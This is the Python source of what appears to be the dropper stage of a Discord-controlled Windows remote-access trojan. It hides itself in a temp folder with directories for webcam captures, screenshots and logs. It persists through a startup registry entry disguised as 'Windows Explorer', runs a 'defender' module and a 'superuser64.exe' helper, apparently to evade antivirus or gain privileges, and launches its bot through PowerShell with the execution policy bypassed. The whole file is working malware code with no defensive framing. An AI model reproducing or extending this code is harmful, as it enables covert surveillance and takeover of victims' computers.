# coding=UTF-8

import asyncio
import os
import subprocess
import time
import venv
import ThreadManager
import sys


async def Hide():
    folderTarg = "%temp%\\123456789\\"
    payload = r"echo {}".format(folderTarg)
    execute = subprocess.run(payload, shell=True, capture_output=True)
    folder = execute.stdout
    print(folder.decode(encoding="utf-8"))
    folder = folder.decode(encoding="utf-8")
    folderstr = folder.replace(r"\\", "\\").replace("\r\n", "")
    print(folderstr)

    try:
        await getSettled(folderstr)
    except Exception as e:
        print("An error has occured: " + str(e))
    os.chdir(folderstr)
    return folderstr

async def getSettled(targetDir):
    try:
        os.mkdir(targetDir)
        os.mkdir("{}\\downloads".format(targetDir))
        os.mkdir("{}\\WebcamCaptures".format(targetDir))
        os.mkdir("{}\\ScreenShots".format(targetDir))
        os.mkdir("{}\\logs".format(targetDir))
    except FileExistsError:
        pass
    
    # Create target venv directory
    venv_target = os.path.join(targetDir, "venv")
    if not os.path.exists(venv_target):
        os.makedirs(venv_target)
    
    # Copy source files
    payload = "xcopy /Y /E /I src\\* {0}".format(targetDir)
    print(payload)
    copySourceFiles = subprocess.run(payload, shell=True, capture_output=True)
    
    # Copy venv files - use robocopy for better reliability with system files
    venv_source = os.path.abspath("venv")
    robocopy_cmd = f'robocopy "{venv_source}" "{venv_target}" /E /COPY:DAT /R:1 /W:1'
    print(robocopy_cmd)
    copyVenvFiles = subprocess.run(robocopy_cmd, shell=True, capture_output=True)
    
    # Copy .env file if it exists
    if os.path.exists(".env"):
        env_cmd = "xcopy /Y .env {0}".format(targetDir)
        copyEnvFile = subprocess.run(env_cmd, shell=True, capture_output=True)
    
    print(time.gmtime())
    
    # Check for errors
    if copySourceFiles.stderr.__len__() > 0:
        print("Error copying source files")
        print(copySourceFiles.stderr.decode("utf-8"))
    
    # Note: robocopy returns non-zero exit codes for success, so don't check stderr
    
    try:
        print("Source files output:", copySourceFiles.stdout.decode("utf-8"))
        print("Venv files output:", copyVenvFiles.stdout.decode("utf-8"))
    except Exception as e:
        print("Error decoding output:", e)
    
    return venv_target
async def Activated(targetDir):
    import persist
    
    persist.add_to_startup_registry("Windows Explorer", "python.exe {}\\discordbot.py".format(targetDir), True)
    
    import defender
    targetFile = "downloads\\superuser64.exe /ws"
    defenderFile = ".\\defender.py && .\\ThreadManager.py"
    payload = "{0} python.exe {1}".format(targetFile, defenderFile)
    docoolstuff = subprocess.run(payload, shell=True, capture_output=True)
    print(docoolstuff.stdout.decode("utf-8"), docoolstuff.stderr.decode("utf-8"), sep="\n\n")
    
    botFile = os.path.join(targetDir, "run_discordbot.bat")
    sys32dir = os.listdir("C:\\Windows\\System32")
    try:
        windowsPowerShellv1_0dir = os.listdir("C:\\Windows\\System32\\WindowsPowerShell\\v1.0")
        if "powershell.exe" in windowsPowerShellv1_0dir:
            print("WindowsPowerShell\\v1.0 is the powershell folder!")
        botpayload = repr("shell=True, capture_output=True, args=f'[os.getcwd()]\\{0} C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -Command $& {1}$'".format(targetFile, botFile).replace("[", "{").replace("]","}"))
        print(botpayload, '\n'*25)
    except:
        pass
    
    if "powershell.exe" in sys32dir:
        print("System32 is the powershell folder!")

        botpayload = repr("shell=True, capture_output=True, args=f'[os.getcwd()]\\{0} C:\\Windows\\System32\\powershell.exe -ExecutionPolicy Bypass -Command $& {1}$'".format(targetFile, botFile).replace("[", "{").replace("]","}"))
    
    return botpayload

def checkfileinDir(dir: list, targFile:str) -> bool:
    for file in dir:
        if targFile == file:
            print("Found {}".format(targFile))
            return True
            

async def runBotBatch(payload):
    directory = os.listdir()
    botFile = None
    hopeToFindFile = "run_discordbot.bat"
    botFile = checkfileinDir(directory, hopeToFindFile)
    

    venv_python = os.path.join(os.getcwd(), "venv", "Scripts", "python.exe")
    #startBot = subprocess.run(botpayload, shell=True, capture_output=True)
    thread1 = ThreadManager.ThreadManager(target=printNewFile, args=payload, name="DiscordBot")
    thread1.start()
    print("Joining the writing thread")
    thread1.join()

    print("Stamping the file.")
    stampBatch()
    print("File stamped!")
    
    print(time.gmtime())
    print("Starting the cool file\n\n\n\n")
    startBot2 = subprocess.Popen(f"{os.getcwd()}\\coolfile.py", shell=True, stdout=sys.stdout, stderr=sys.stderr)
    startBot2.wait()
    print(startBot2.returncode, " ~ runBotBatch")
    print(time.gmtime(), "1234445555544", sep="\n")
   

def stampBatch():
    batch_file_path = os.path.join(os.getcwd(), "run_discordbot.bat")
    with open(batch_file_path, "r", encoding="utf-8") as file:
        allAsList = file.readlines()

    newerList = []
    for i in allAsList:
        if "&&CURDIR&&" in i:
            print("FOUND &&CURDIR&& \nLine = {}".format(i))
            i = i.replace("&&CURDIR&&", os.getcwd())
        elif "&&VENVDIR&&" in i:
            print("FOUND &&VENVDIR&& \nLine = {}".format(i))
            i = i.replace("&&VENVDIR&&", os.path.join(os.getcwd(), "venv"))
        newerList.append(i)
    with open(batch_file_path, "w", encoding="utf-8") as file:
        file.writelines(newerList)
    print("Batch file updated!")

def printNewFile(payload):
    fileConts = f"""
# coding=UTF-8

import subprocess
import os

class NewFile:
    def __init__(self):
        self.thread = subprocess.run({payload})
        print('SUCCESS STARTING NEW THREAD')
        print(self.thread.stdout, $ ~ printNewFile STDOUT$)
        print(self.thread.stderr, $ ~ printNewFile STDERR$)

if __name__ == '__main__':
    print(os.getcwd())
    main = NewFile()
    print(main.thread.returncode)
    print(main.thread.args)
""".replace("\"", "").replace("$", "\"")
    print(payload, "\n\n\n\n")
    print(fileConts)
    with open("coolfile.py", "w", encoding="utf-8") as file:
        file.write(fileConts)
    print("Writing thread writing to stdout: FINISHED")



async def main():
    hide = asyncio.create_task(Hide())
    takesometime = await asyncio.wait([hide])
    act = asyncio.create_task(Activated(hide.result()))
    takesometimeagain = await asyncio.wait([act])
    
    await runBotBatch(act.result())
    print("Hoi from async")

if __name__ == "__main__":
    asyncio.run(main())
    print("Hoi from main")